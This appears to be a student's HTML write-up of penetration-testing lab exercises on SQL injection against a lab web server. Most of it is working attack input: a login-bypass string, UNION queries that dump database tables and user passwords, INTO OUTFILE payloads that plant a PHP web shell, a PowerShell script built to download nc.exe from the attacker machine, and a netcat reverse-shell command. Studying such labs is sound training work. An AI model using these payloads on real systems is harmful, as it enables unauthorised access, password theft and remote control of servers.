@@ -1,0 +1,93 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises-13.4.1.1-MySQL Injection</title>
+</head><body>13.4.1.1 - Exercises<br/>
+1. Interact with the MySQL database and manually execute the commands as the<br/>
+web server does as part of the authentication process. Understand the<br/>
+vulnerability.<br/>
+2. Utilize SQL injection to bypass the login process.<br/>
+3. Understand why the username is reported like it is once the authentication<br/>
+process is bypassed.<br/>
+<br/>
+1.<br/>
+Interacted with database and manually executed the commands to understand the vulnerability.<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+2.<br/>
+Utilized SQL injection to by pass the login process by entering this in the username field:<br/>
+<b>any' or 1=1 limit 1;#</b><br/>
+<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+3. The username is reported like this because it is what was entered into the query after the first single quote for the username and was then terminated with the octothorp.<br/>
+<br/>
+13.4.5.1 - Exercises<br/>
+1. Enumerate the structure of the database using SQL injection.<br/>
+2. Understand how and why you can pull data from your injected commands and<br/>
+have it displayed on the screen.<br/>
+3. Extract all users and associated passwords from the database.<br/>
+<br/>
+1.<br/>
+Database structure enumerated with this URL input:<br/>
+<b>http://10.11.10.124/comment.php?id=738%20union%20all%20select%201,2,3,4,table_name,6%20FROM%20information_schema.tables</b><br/>
+<img src="screenshot 3.png" /><br/>
+<img src="screenshot 4.png" /><br/>
+<br/>
+2.<br/>
+We can pull data from the injected commands and have it displayed on the screen because the input is not sanitized. The php code does not utilize sanitizing funtions to make sure only valid input is allowed.<br/>
+<br/>
+3.<br/>
+All users and passwords extracted with this URL input:<br/>
+<b>http://10.11.10.124/comment.php?id=738%20union%20select%201,2,name,4,password,6%20FROM%20users</b><br/>
+<img src="screenshot 5.png" /><br/>
+<br/>
+13.4.6.1 - Exercises<br/>
+1. Exploit the SQL injection along with the MySQL INTO OUTFILE function to<br/>
+obtain code execution.<br/>
+2. Turn the simple code execution into a full shell.<br/>
+<br/>
+1.<br/>
+Obtained code execution through backdoor.php file by using this in the URL:<br/>
+<b>http://10.11.10.124/comment.php?id=738 union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'</b><br/>
+<br/>
+Then called the file in the URL: <b>10.11.10.124/backdoor.php?cmd=ipconfig</b><br/>
+<img src="screenshot 6.png" /><br/>
+<br/>
+2.<br/>
+Obtained full shell through entering this in URL:<br/>
+http://10.11.10.124/backdoor.php?cmd=nc.exe -nv 10.11.0.187 443 -e cmd.exe<br/>
+<br/>
+<b>Really need to download nc.exe first. Use the same format as in exercise 13.5.1 #2 to create a wget.ps1 file, download nc.exe, and then enter the nc.exe -nv 10.11.0.187 443 -e cmd.exe command.</b><br/>
+<img src="screenshot 7.png" /><br/>
+<br/>
+13.5.1 - Exercises<br/>
+1. Use Tamper Data to cause SQL injection on the lang parameter.<br/>
+2. Identify how far you can push this vulnerability. Can you obtain a full shell?<br/>
+<br/>
+1.<br/>
+SQL injection by replacing "en" with single quote in the LANG parameter.<br/>
+<img src="screenshot 8.png" /><br/>
+<br/>
+2.<br/>
+Full shell obtained by entering this in the LANG field in Tamper Data plugin. This input creates the php file on the computer. After that we can enter several URLs with commands to send nc.exe to the server and then execute the command for a reverse shell.<br/>
+<b>en' union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/xampp/htdocs/backdoor2.php';#'<br/>
+</b><br/>
+Then enter these URLs in sequence to create the wget.ps1 file:<br/>
+<b>http://10.11.10.124/backdoor2.php?cmd="echo $storageDir = $pwd &gt; wget.ps1"<br/>
+http://10.11.10.124/backdoor2.php?cmd="echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1"<br/>
+http://10.11.10.124/backdoor2.php?cmd="echo $url = "http://10.11.0.187/nc.exe" &gt;&gt;wget.ps1"<br/>
+http://10.11.10.124/backdoor2.php?cmd="echo $file = "nc.exe" &gt;&gt;wget.ps1"<br/>
+</b><b>http://10.11.10.124/backdoor2.php?cmd="echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1"</b><br/>
+<br/>
+Then enter this URL to execute the wget.ps1 file which downloads nc.exe:<br/>
+<b>http://10.11.10.124/backdoor2.php?cmd="powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"</b><br/>
+<br/>
+Then enter this URL to send the reverse shell to my Kali machine:<br/>
+<b>http://10.11.10.124/backdoor2.php?cmd="C:\xampp\htdocs\nc.exe -nv 10.11.0.187 443 -e cmd.exe"<br/>
+<br/>
+</b><img src="screenshot 9.png" /><br/>
+<br/>
+<br/>
+</body></html>
